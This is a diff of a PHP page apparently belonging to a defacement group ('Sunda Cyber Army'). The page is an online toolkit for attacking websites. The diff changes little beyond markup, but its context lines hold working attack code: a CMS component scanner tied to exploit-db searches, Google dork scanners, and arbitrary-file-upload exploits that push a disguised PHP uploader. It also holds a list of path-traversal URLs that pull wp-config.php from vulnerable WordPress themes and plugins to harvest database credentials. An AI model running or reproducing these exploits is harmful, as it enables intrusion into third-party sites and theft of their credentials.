@@ -3,9 +3,9 @@
 <link rel="icon" type="image/jpg" href='https://seken.co.id/assets/uploads/post/Monkey-de-Luffy-One-Piece-81.jpg'/>
 <center><h1><b><font color="blue"> { SUNDA CYBER ARMY } </font></b></h1></center>
 <center><img border="0" src="https://seken.co.id/assets/uploads/post/Monkey-de-Luffy-One-Piece-81.jpg" width="300" height="250">
-<pre><hr><center><h2><i><font color="blue"> -= > sundacyberarmy@gmail.com | https://www.xploiters77.ml | http://www.xploiters77.cf <=- </font></i></h2></hr></pre> 
-<pre><hr><center><h2><i><font color="blue"> -=> Channel Youtube : Sunda Cyber Army | Fanspage : https://www.facebook.com/SundaCyberArmy/ <=- </font></i></h2></center></hr></pre>
-<hr><center><h2><i><font color="blue"> -=> Github : https://github/MrdSca <=- </font></i></h2></center></hr>
+<pre><hr><center><h1><i><font color="blue"> -= > sundacyberarmy@gmail.com | https://www.xploiters77.ml | http://www.xploiters77.cf <=- </font></i></h1></hr></pre> 
+<pre><hr><center><h1><i><font color="blue"> -=> Channel Youtube : Sunda Cyber Army | Fanspage : https://www.facebook.com/SundaCyberArmy/ <=- </font></i></h1></center></hr></pre>
+<hr><center><h1><i><font color="blue"> -=> Github : https://github/MrdSca <=- </font></i></h1></center></hr>
 <hr><iframe width="0%" height="0" scrolling="no" frameborder="no" loop="true" allow="autoplay" src="https://d.top4top.net/m_10932vbu71.mp3"></iframe></hr>
 <?php
  
@@ -50,7 +50,6 @@ border-radius:5px;
 -webkit-box-shadow: inset 0 1px 2px rgba(0, 0, 0, 0.1), 0 1px rgba(255, 255, 255, 0.5);
 box-shadow: inset 0 1px 2px rgba(0, 0, 0, 0.1), 0 1px rgba(255, 255, 255, 0.5);
 }
-
 a  {text-decoration:none; font-family: 'Berlin Sans FB', Arial, sans-serif;color:#FFFFFF;} 
 a:hover {text-decoration:none;color:#fffffff;background:#0078FF; 
 }
@@ -124,155 +123,89 @@ echo '<br> Dasar Heiker :v !<br>';
 if ($_GET['Scanexploit'] == 'Done!') {
 ?>
 <?php
-
 @set_time_limit(0);
 @error_reporting(0);
-
 // Script Functions , start ..!
-
 function ask_exploit_db($component){
-
 $exploitdb ="http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=$component&filter_exploit_text=&filter_author=&filter_platform=0&filter_type=0&filter_lang_id=0&filter_port=&filter_osvdb=&filter_cve=";
-
 $result = @file_get_contents($exploitdb);
-
 if (eregi("No results",$result))  {
-
 echo"<td>Not Found</td><td><a href='http://www.google.com/search?hl=en&q=download+$component'>Download</a></td></tr>";
-
 }else{
-
 echo"<td><a href='$exploitdb'>Found ..!</a></td><td><--</td></tr>";
-
 }
 }
-
 /**************************************************************/
 /* Joomla Conf */
-
 function get_components($site){
-
 $source = @file_get_contents($site);
-
 preg_match_all('{option,(.*?)/}i',$source,$f);
 preg_match_all('{option=(.*?)(&amp;|&|")}i',$source,$f2);
 preg_match_all('{/components/(.*?)/}i',$source,$f3);
-
 $arz=array_merge($f2[1],$f[1],$f3[1]);
-
 $coms=array();
-
 if(count($arz)==0){ echo "<tr><td colspan=3>[~] Tidak ada yang ditemukan ..! , Mungkin ada beberapa situs atau opsi galat ... periksa.</td></tr>";}
-
 foreach(array_unique($arz) as $x){
-
 $coms[]=$x;
 }
-
 foreach($coms as $comm){
-
 echo "<tr><td>$comm</td>";
-
 ask_exploit_db($comm);
-
 }
-
 }
-
 /**************************************************************/
 /* WP Conf */
-
 function get_plugins($site){
-
 $source = @file_get_contents($site);
-
 preg_match_all("#/plugins/(.*?)/#i", $source, $f);
-
 $plugins=array_unique($f[1]);
-
 if(count($plugins)==0){ echo "<tr><td colspan=1>[~] Tidak ada yang ditemukan ..! , Mungkin ada beberapa situs atau opsi galat ... periksa.</td></tr>";}
-
 foreach($plugins as $plugin){
-
 echo "<tr><td>$plugin</td>";
-
 ask_exploit_db($plugin);
-
 }
-
 }
-
 /**************************************************************/
 /* Nuke's Conf */
-
 function get_numod($site){
-
 $source = @file_get_contents($site);
-
 preg_match_all('{?name=(.*?)/}i',$source,$f);
 preg_match_all('{?name=(.*?)(&amp;|&|l_op=")}i',$source,$f2);
 preg_match_all('{/modules/(.*?)/}i',$source,$f3);
-
 $arz=array_merge($f2[1],$f[1],$f3[1]);
-
 $coms=array();
-
 if(count($arz)==0){ echo "<tr><td colspan=3>[~] Tidak ada yang ditemukan ..! , Mungkin ada beberapa situs atau opsi galat ... periksa.</td></tr>";}
-
 foreach(array_unique($arz) as $x){
-
 $coms[]=$x;
 }
-
 foreach($coms as $nmod){
-
 echo "<tr><td>$nmod</td>";
-
 ask_exploit_db($nmod);
-
 }
-
 }
-
 /*****************************************************/
 /* Xoops Conf */
-
 function get_xoomod($site){
-
 $source = @file_get_contents($site);
-
 preg_match_all('{/modules/(.*?)/}i',$source,$f);
-
 $arz=array_merge($f[1]);
-
 $coms=array();
-
 if(count($arz)==0){ echo "<tr><td colspan=3>[~] Tidak ada yang ditemukan ..! , Mungkin ada beberapa situs atau opsi galat ... periksa.</td></tr>";}
-
 foreach(array_unique($arz) as $x){
-
 $coms[]=$x;
 }
-
 foreach($coms as $xmod){
-
 echo "<tr><td>$xmod</td>";
-
 ask_exploit_db($xmod);
-
 }
-
 }
-
 /**************************************************************/
  /* Header */
 function t_header($site){
-
 ?>
 
 <?
 echo'<table align="center" border="1" width="50%" cellspacing="1" cellpadding="5">';
-
 echo'
 <tr>
 <td>Site : <a href="'.$site.'">'.$site.'</a></td>
@@ -280,9 +213,7 @@ echo'
 <td>Exploit it !</td>
 </tr>
 ';
-
 }
-
 ?>
 <center><a Style='font-size:30px;'><br>
 Cms Scanner Vuln  Online</a></center><center>
@@ -299,20 +230,14 @@ Cms Scanner Vuln  Online</a></center><center>
 	</select><br><br><input type="submit" value="Get Xploit" class='button'></p>
 </form>
 <?
-
 // Start Scan :P :P ...
-
 if($_POST){
-
 $site=strip_tags(trim($_POST['site']));
-
 t_header($site);
-
 echo $x01 = ($_POST['what']=="Wordpress") ? get_plugins($site):"";
 echo $x02 = ($_POST['what']=="Joomla") ? get_components($site):"";
 echo $x03 = ($_POST['what']=="Nuke's") ? get_numod($site):"";
 echo $x04 = ($_POST['what']=="Xoops") ? get_xoomod($site):"";
-
 }
 exit;
 }
@@ -404,7 +329,6 @@ if ($_GET['CatproManage'] == 'Done!') {
 @set_time_limit(0);
 /*
 */
-
 ?><br><center><a Style='font-size:30px;color:#ededed;'>Wordpress Catpro Gallery (AFU)</a></center><center>
 Dork : /wp-admin/admin.php?page=catpro_manage <br>
 	<form method='post' class='header-izz'>
@@ -456,7 +380,6 @@ if($go) {
 foreach($site as $sites) {
 	
 $uploader = 'sca.php.xxxjpg';
-
 $ch = curl_init("{$sites}/assets/global/plugins/jquery-file-upload/server/php/");
 curl_setopt($ch, CURLOPT_POST, 1);
 curl_setopt($ch, CURLOPT_POSTFIELDS,
@@ -489,7 +412,6 @@ Dork: <br><br><input type="text" name="dork" value="inurl:/semua-berita.html" si
 <input type="submit" value="scan" class='button'>
 </form>
 <?php
-
 class MK {
 	public $dork;
 	public function google($dork, $page) {
@@ -691,10 +613,8 @@ Target: <br><br><textarea name="url"  placeholder="http://www.targetlu.com/" sty
 <input type='submit' name='exp' value='Done!' class='button'>
 </form>
 <?php
-
 set_time_limit(0);
 error_reporting(0);
-
 function buffer() {
 	ob_flush();
 	flush();
@@ -769,7 +689,6 @@ Target: <br><br><textarea name="url"  placeholder="http://www.targetlu.com/" sty
 // IndoXploit
 set_time_limit(0);
 error_reporting(0);
-
 function buffer() {
 	ob_flush();
 	flush();
@@ -831,7 +750,6 @@ if ($_GET['uploadimages'] == 'Done!') {
 @ini_set('log_errors',0);
 @ini_set('display_errors', 0);
 @set_time_limit(0);
-
 echo"<br><center><a Style='font-size:30px;color:#ededed;'> Modules Upload Files (uploadimages)</a></center><center>
 <br>
 /uploadimages.php<br>
@@ -839,7 +757,6 @@ Dork : /modules/simpleslideshow/<br>
 Dork : /modules/productpageadverts/<br>
 Dork : /modules/homepageadvertise/<br>
 Dork : /modules/columnadverts/<br>
-
 <form  method='post'  class='header-izz'>
 	Domain: <br><br>
 	<textarea placeholder='http://www.targetlu.com/' name='url' style='width: 350px; height:50px;' class='checkout-input'></textarea><br><br>
@@ -935,7 +852,6 @@ curl_close($ch);
     $users = @file_get_contents("$site/?author=1");
     preg_match('/<title>(.*?)<\/title>/si',$users,$user);
     $wpuser = explode('|',$user[1]);
-
 echo "Site : ".$site."<br> Wp User : ".$wpuser[0]."<br> Version : ".$str."<br>"; }
 $expl = array("wp-content/themes/antioch/lib/scripts/download.php?file=../../../../../wp-config.php","wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php","wp-content/themes/authentic/includes/download.php?file=../../../../wp-config.php","wp-content/themes/urbancity/lib/scripts/download.php?file=wp-config.php","wp-content/themes/NativeChurch/download/download.php?file=../../../../wp-config.php","wp-content/themes/acento/includes/view-pdf.php?download=1&file=../../../../wp-config.php","wp-content/force-download.php?file=../wp-config.php","wp-content/themes/lote27/download.php?download=../../../wp-config.php","wp-content/plugins/wp-custom-pages/wp-download.php?download=../../../wp-config.php");
 foreach($expl as $exploit){
@@ -993,7 +909,6 @@ if ($_GET['mail-masta'] == 'Done!') {
 @ini_set('log_errors',0);
 @ini_set('display_errors', 0);
 @set_time_limit(0);
-
 echo"<br><center><a Style='font-size:30px;color:#ededed;'>Wordpress Auto Get DataBase (AFD)</a></center><center>
 <br>
 Dork :  /wp-content/plugins/mail-masta/inc/campaign/count_of_send.php <br>
@@ -1030,7 +945,6 @@ echo "DB_HOST:{$DB_HOST[1]}<br>";
 }
 exit;
 }
-
 /////
 if ($_GET['forcedownload'] == 'Done!') {
 @session_start(); 
@@ -1039,7 +953,6 @@ if ($_GET['forcedownload'] == 'Done!') {
 @ini_set('log_errors',0);
 @ini_set('display_errors', 0);
 @set_time_limit(0);
-
 echo"<br><center><a Style='font-size:30px;color:#ededed;'>WordPress Get Database | RB-Agency </a></center><center>
 <br>
 Dork :  /wp-content/plugins/rb-agency/ext/forcedownload.php?file=<br>
